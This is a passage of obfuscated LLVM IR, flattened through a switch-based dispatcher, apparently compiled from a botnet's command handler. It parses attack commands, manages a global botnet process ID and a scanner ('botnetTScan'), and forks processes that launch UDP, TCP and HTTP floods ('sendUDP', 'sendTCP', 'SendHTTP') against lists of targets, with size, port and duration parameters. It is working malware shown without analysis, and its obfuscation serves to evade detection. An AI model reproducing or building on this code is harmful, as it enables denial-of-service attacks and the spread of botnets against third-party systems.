  store i32 -215268038, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -215268038, label %first
    i32 -1301055951, label %37
    i32 -262641819, label %44
    i32 -225066101, label %48
    i32 1840838323, label %49
    i32 -1517893195, label %52
    i32 986745111, label %59
    i32 -1973447345, label %63
    i32 1562943329, label %64
    i32 -2088012192, label %69
    i32 1664842570, label %71
    i32 -791462754, label %75
    i32 184739602, label %76
    i32 1372019727, label %77
    i32 1245777352, label %80
    i32 -2105037747, label %81
    i32 602781029, label %88
    i32 1646391123, label %92
    i32 -884409184, label %99
    i32 -1173043174, label %106
    i32 1825418239, label %113
    i32 1049330789, label %120
    i32 -705280380, label %127
    i32 1607521999, label %134
    i32 -917590512, label %141
    i32 -767901957, label %145
    i32 2108882570, label %152
    i32 1267701080, label %153
    i32 255508506, label %176
    i32 -1408744560, label %181
    i32 716949166, label %182
    i32 -1581730668, label %186
    i32 -87949331, label %191
    i32 -210255914, label %192
    i32 -1887403189, label %196
    i32 -752060312, label %201
    i32 -1047436199, label %202
    i32 166125142, label %207
    i32 875937028, label %210
    i32 -881682859, label %214
    i32 1006429723, label %218
    i32 1229258964, label %227
    i32 -2071238723, label %229
    i32 -1665759696, label %230
    i32 -921094059, label %234
    i32 -1342538850, label %243
    i32 200880829, label %244
    i32 2052637970, label %245
    i32 1221174548, label %252
    i32 1795581229, label %256
    i32 1082047522, label %263
    i32 -1486218805, label %270
    i32 1711199487, label %277
    i32 -947640424, label %284
    i32 -1947734634, label %288
    i32 -1826966145, label %295
    i32 937521630, label %299
    i32 -353483900, label %306
    i32 -518309060, label %307
    i32 -1397529376, label %329
    i32 1808251347, label %334
    i32 -1808080162, label %335
    i32 -1968002424, label %339
    i32 -279810056, label %344
    i32 1116825616, label %345
    i32 1621555852, label %350
    i32 1154250619, label %353
    i32 -690576866, label %357
    i32 -838635764, label %361
    i32 -1066173490, label %369
    i32 304417220, label %371
    i32 -1688735017, label %372
    i32 -617378305, label %376
    i32 698781548, label %384
    i32 -82649252, label %385
    i32 1472018707, label %386
    i32 1911406215, label %393
    i32 -2053791024, label %397
    i32 -2091471127, label %404
    i32 -1534114498, label %411
    i32 -573227058, label %412
    i32 -1674948690, label %416
    i32 -1984310485, label %417
    i32 740307725, label %440
    i32 484339013, label %447
    i32 2021250991, label %451
    i32 1427977648, label %458
    i32 -1704427050, label %465
    i32 -632175934, label %466
    i32 576115112, label %470
    i32 499023425, label %471
    i32 -1633017329, label %494
    i32 -1372321835, label %501
    i32 -1439748970, label %505
    i32 -1022036048, label %512
    i32 -1962106719, label %519
    i32 -270431427, label %520
    i32 -304837271, label %536
    i32 -1525998357, label %539
    i32 -434286297, label %543
    i32 -899876572, label %547
    i32 1807203188, label %551
    i32 -1027729449, label %553
    i32 -1124586084, label %554
    i32 472547646, label %558
    i32 -1831215547, label %559
    i32 1179137503, label %563
    i32 549567755, label %564
    i32 1616966508, label %571
    i32 1136214991, label %572
    i32 1352161794, label %577
    i32 -326721469, label %584
    i32 194695497, label %592
    i32 2088358072, label %600
    i32 1471689713, label %601
    i32 -366197492, label %604
    i32 2134979631, label %605
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -2105037747, i32 -1301055951
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.153, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -1517893195, i32 -262641819
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* @botnetPid, align 4
  %46 = icmp eq i32 %45, 0
  %47 = select i1 %46, i32 -225066101, i32 1840838323
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* @botnetPid, align 4
  %51 = call i32 @kill(i32 %50, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  store i32 -1517893195, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.154, i32 0, i32 0)) #9
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 1245777352, i32 986745111
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* @botnetPid, align 4
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 -1973447345, i32 1562943329
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = call i32 @fork() #3
  store i32 %65, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %66 = load i32, i32* %5, align 4
  %67 = icmp ugt i32 %66, 0
  %68 = select i1 %67, i32 -2088012192, i32 1664842570
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  store i32 %70, i32* @botnetPid, align 4
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %5, align 4
  %73 = icmp eq i32 %72, -1
  %74 = select i1 %73, i32 -791462754, i32 184739602
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 1372019727, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %7, align 4
  %79 = load i32, i32* %6, align 4
  call void @botnetTScan(i32 %78, i32 %79)
  call void @_exit(i32 0) #12
  unreachable

; <label>:80:                                     ; preds = %loopEntry
  store i32 -2105037747, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8**, i8*** %4, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.155, i32 0, i32 0)) #9
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 2052637970, i32 602781029
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %3, align 4
  %90 = icmp slt i32 %89, 6
  %91 = select i1 %90, i32 2108882570, i32 1646391123
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8**, i8*** %4, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 3
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @atoi(i8* %95) #9
  %97 = icmp eq i32 %96, -1
  %98 = select i1 %97, i32 2108882570, i32 -884409184
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8**, i8*** %4, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 2
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @atoi(i8* %102) #9
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 2108882570, i32 -1173043174
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 4
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @atoi(i8* %109) #9
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 2108882570, i32 1825418239
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 5
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @atoi(i8* %116) #9
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 2108882570, i32 1049330789
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 5
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* %123) #9
  %125 = icmp sgt i32 %124, 65536
  %126 = select i1 %125, i32 2108882570, i32 -705280380
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8**, i8*** %4, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 5
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 @atoi(i8* %130) #9
  %132 = icmp sgt i32 %131, 65500
  %133 = select i1 %132, i32 2108882570, i32 1607521999
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 4
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @atoi(i8* %137) #9
  %139 = icmp sgt i32 %138, 32
  %140 = select i1 %139, i32 2108882570, i32 -917590512
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i32, i32* %3, align 4
  %143 = icmp eq i32 %142, 7
  %144 = select i1 %143, i32 -767901957, i32 1267701080
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 6
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* %148) #9
  %150 = icmp slt i32 %149, 1
  %151 = select i1 %150, i32 2108882570, i32 1267701080
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i8**, i8*** %4, align 8
  %155 = getelementptr inbounds i8*, i8** %154, i64 1
  %156 = load i8*, i8** %155, align 8
  store i8* %156, i8** %8, align 8
  %157 = load i8**, i8*** %4, align 8
  %158 = getelementptr inbounds i8*, i8** %157, i64 2
  %159 = load i8*, i8** %158, align 8
  %160 = call i32 @atoi(i8* %159) #9
  store i32 %160, i32* %9, align 4
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 3
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #9
  store i32 %164, i32* %10, align 4
  %165 = load i8**, i8*** %4, align 8
  %166 = getelementptr inbounds i8*, i8** %165, i64 4
  %167 = load i8*, i8** %166, align 8
  %168 = call i32 @atoi(i8* %167) #9
  store i32 %168, i32* %11, align 4
  %169 = load i8**, i8*** %4, align 8
  %170 = getelementptr inbounds i8*, i8** %169, i64 5
  %171 = load i8*, i8** %170, align 8
  %172 = call i32 @atoi(i8* %171) #9
  store i32 %172, i32* %12, align 4
  %173 = load i32, i32* %3, align 4
  %174 = icmp sgt i32 %173, 6
  %175 = select i1 %174, i32 255508506, i32 -1408744560
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8**, i8*** %4, align 8
  %178 = getelementptr inbounds i8*, i8** %177, i64 6
  %179 = load i8*, i8** %178, align 8
  %180 = call i32 @atoi(i8* %179) #9
  store i32 716949166, i32* %switchVar
  store i32 %180, i32* %.reg2mem2
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 716949166, i32* %switchVar
  store i32 1000, i32* %.reg2mem2
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %13, align 4
  %183 = load i32, i32* %3, align 4
  %184 = icmp sgt i32 %183, 7
  %185 = select i1 %184, i32 -1581730668, i32 -87949331
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 7
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #9
  store i32 -210255914, i32* %switchVar
  store i32 %190, i32* %.reg2mem4
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  store i32 -210255914, i32* %switchVar
  store i32 1000000, i32* %.reg2mem4
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %14, align 4
  %193 = load i32, i32* %3, align 4
  %194 = icmp sgt i32 %193, 8
  %195 = select i1 %194, i32 -1887403189, i32 -752060312
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 8
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #9
  store i32 -1047436199, i32* %switchVar
  store i32 %200, i32* %.reg2mem6
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  store i32 -1047436199, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %15, align 4
  %203 = load i8*, i8** %8, align 8
  %204 = call i8* @strstr(i8* %203, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %205 = icmp ne i8* %204, null
  %206 = select i1 %205, i32 166125142, i32 -1665759696
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %8, align 8
  %209 = call i8* @strtok(i8* %208, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %209, i8** %16, align 8
  store i32 875937028, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8*, i8** %16, align 8
  %212 = icmp ne i8* %211, null
  %213 = select i1 %212, i32 -881682859, i32 -2071238723
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = call i32 @listFork()
  %216 = icmp ne i32 %215, 0
  %217 = select i1 %216, i32 1229258964, i32 1006429723
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8*, i8** %16, align 8
  %220 = load i32, i32* %9, align 4
  %221 = load i32, i32* %10, align 4
  %222 = load i32, i32* %11, align 4
  %223 = load i32, i32* %12, align 4
  %224 = load i32, i32* %13, align 4
  %225 = load i32, i32* %14, align 4
  %226 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %219, i32 %220, i32 %221, i32 %222, i32 %223, i32 %224, i32 %225, i32 %226)
  call void @_exit(i32 0) #12
  unreachable

; <label>:227:                                    ; preds = %loopEntry
  %228 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %228, i8** %16, align 8
  store i32 875937028, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 200880829, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = call i32 @listFork()
  %232 = icmp ne i32 %231, 0
  %233 = select i1 %232, i32 -1342538850, i32 -921094059
  store i32 %233, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i8*, i8** %8, align 8
  %236 = load i32, i32* %9, align 4
  %237 = load i32, i32* %10, align 4
  %238 = load i32, i32* %11, align 4
  %239 = load i32, i32* %12, align 4
  %240 = load i32, i32* %13, align 4
  %241 = load i32, i32* %14, align 4
  %242 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %235, i32 %236, i32 %237, i32 %238, i32 %239, i32 %240, i32 %241, i32 %242)
  call void @_exit(i32 0) #12
  unreachable

; <label>:243:                                    ; preds = %loopEntry
  store i32 200880829, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 0
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @strcmp(i8* %248, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %250 = icmp ne i32 %249, 0
  %251 = select i1 %250, i32 1472018707, i32 1221174548
  store i32 %251, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i32, i32* %3, align 4
  %254 = icmp slt i32 %253, 6
  %255 = select i1 %254, i32 -353483900, i32 1795581229
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 3
  %259 = load i8*, i8** %258, align 8
  %260 = call i32 @atoi(i8* %259) #9
  %261 = icmp eq i32 %260, -1
  %262 = select i1 %261, i32 -353483900, i32 1082047522
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 2
  %266 = load i8*, i8** %265, align 8
  %267 = call i32 @atoi(i8* %266) #9
  %268 = icmp eq i32 %267, -1
  %269 = select i1 %268, i32 -353483900, i32 -1486218805
  store i32 %269, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i8**, i8*** %4, align 8
  %272 = getelementptr inbounds i8*, i8** %271, i64 4
  %273 = load i8*, i8** %272, align 8
  %274 = call i32 @atoi(i8* %273) #9
  %275 = icmp eq i32 %274, -1
  %276 = select i1 %275, i32 -353483900, i32 1711199487
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds i8*, i8** %278, i64 4
  %280 = load i8*, i8** %279, align 8
  %281 = call i32 @atoi(i8* %280) #9
  %282 = icmp sgt i32 %281, 32
  %283 = select i1 %282, i32 -353483900, i32 -947640424
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i32, i32* %3, align 4
  %286 = icmp sgt i32 %285, 6
  %287 = select i1 %286, i32 -1947734634, i32 -1826966145
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #9
  %293 = icmp slt i32 %292, 0
  %294 = select i1 %293, i32 -353483900, i32 -1826966145
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %3, align 4
  %297 = icmp eq i32 %296, 8
  %298 = select i1 %297, i32 937521630, i32 -518309060
  store i32 %298, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 7
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @atoi(i8* %302) #9
  %304 = icmp slt i32 %303, 1
  %305 = select i1 %304, i32 -353483900, i32 -518309060
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 1
  %310 = load i8*, i8** %309, align 8
  store i8* %310, i8** %17, align 8
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 2
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #9
  store i32 %314, i32* %18, align 4
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 3
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #9
  store i32 %318, i32* %19, align 4
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 4
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #9
  store i32 %322, i32* %20, align 4
  %323 = load i8**, i8*** %4, align 8
  %324 = getelementptr inbounds i8*, i8** %323, i64 5
  %325 = load i8*, i8** %324, align 8
  store i8* %325, i8** %21, align 8
  %326 = load i32, i32* %3, align 4
  %327 = icmp eq i32 %326, 8
  %328 = select i1 %327, i32 -1397529376, i32 1808251347
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 7
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #9
  store i32 -1808080162, i32* %switchVar
  store i32 %333, i32* %.reg2mem8
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  store i32 -1808080162, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %22, align 4
  %336 = load i32, i32* %3, align 4
  %337 = icmp sgt i32 %336, 6
  %338 = select i1 %337, i32 -1968002424, i32 -279810056
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8**, i8*** %4, align 8
  %341 = getelementptr inbounds i8*, i8** %340, i64 6
  %342 = load i8*, i8** %341, align 8
  %343 = call i32 @atoi(i8* %342) #9
  store i32 1116825616, i32* %switchVar
  store i32 %343, i32* %.reg2mem10
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  store i32 1116825616, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %23, align 4
  %346 = load i8*, i8** %17, align 8
  %347 = call i8* @strstr(i8* %346, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %348 = icmp ne i8* %347, null
  %349 = select i1 %348, i32 1621555852, i32 -1688735017
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i8*, i8** %17, align 8
  %352 = call i8* @strtok(i8* %351, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %352, i8** %24, align 8
  store i32 1154250619, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i8*, i8** %24, align 8
  %355 = icmp ne i8* %354, null
  %356 = select i1 %355, i32 -690576866, i32 304417220
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = call i32 @listFork()
  %359 = icmp ne i32 %358, 0
  %360 = select i1 %359, i32 -1066173490, i32 -838635764
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i8*, i8** %24, align 8
  %363 = load i32, i32* %18, align 4
  %364 = load i32, i32* %19, align 4
  %365 = load i32, i32* %20, align 4
  %366 = load i8*, i8** %21, align 8
  %367 = load i32, i32* %23, align 4
  %368 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %362, i32 %363, i32 %364, i32 %365, i8* %366, i32 %367, i32 %368)
  call void @_exit(i32 0) #12
  unreachable

; <label>:369:                                    ; preds = %loopEntry
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %370, i8** %24, align 8
  store i32 1154250619, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  store i32 -82649252, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @listFork()
  %374 = icmp ne i32 %373, 0
  %375 = select i1 %374, i32 698781548, i32 -617378305
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i8*, i8** %17, align 8
  %378 = load i32, i32* %18, align 4
  %379 = load i32, i32* %19, align 4
  %380 = load i32, i32* %20, align 4
  %381 = load i8*, i8** %21, align 8
  %382 = load i32, i32* %23, align 4
  %383 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %377, i32 %378, i32 %379, i32 %380, i8* %381, i32 %382, i32 %383)
  call void @_exit(i32 0) #12
  unreachable

; <label>:384:                                    ; preds = %loopEntry
  store i32 -82649252, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 1472018707, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 0
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @strcmp(i8* %389, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.157, i32 0, i32 0)) #9
  %391 = icmp ne i32 %390, 0
  %392 = select i1 %391, i32 740307725, i32 1911406215
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i32, i32* %3, align 4
  %395 = icmp slt i32 %394, 6
  %396 = select i1 %395, i32 -1534114498, i32 -2053791024
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i8**, i8*** %4, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 3
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @atoi(i8* %400) #9
  %402 = icmp slt i32 %401, 1
  %403 = select i1 %402, i32 -1534114498, i32 -2091471127
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 5
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #9
  %409 = icmp slt i32 %408, 1
  %410 = select i1 %409, i32 -1534114498, i32 -573227058
  store i32 %410, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  %415 = select i1 %414, i32 -1674948690, i32 -1984310485
  store i32 %415, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  store i32 2134979631, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 1
  %420 = load i8*, i8** %419, align 8
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 2
  %423 = load i8*, i8** %422, align 8
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 3
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #9
  %428 = trunc i32 %427 to i16
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 4
  %431 = load i8*, i8** %430, align 8
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 5
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 6
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #9
  call void @SendHTTP(i8* %420, i8* %423, i16 zeroext %428, i8* %431, i32 %435, i32 %439)
  call void @exit(i32 0) #11
  unreachable

; <label>:440:                                    ; preds = %loopEntry
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 0
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @strcmp(i8* %443, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.158, i32 0, i32 0)) #9
  %445 = icmp ne i32 %444, 0
  %446 = select i1 %445, i32 -1633017329, i32 484339013
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
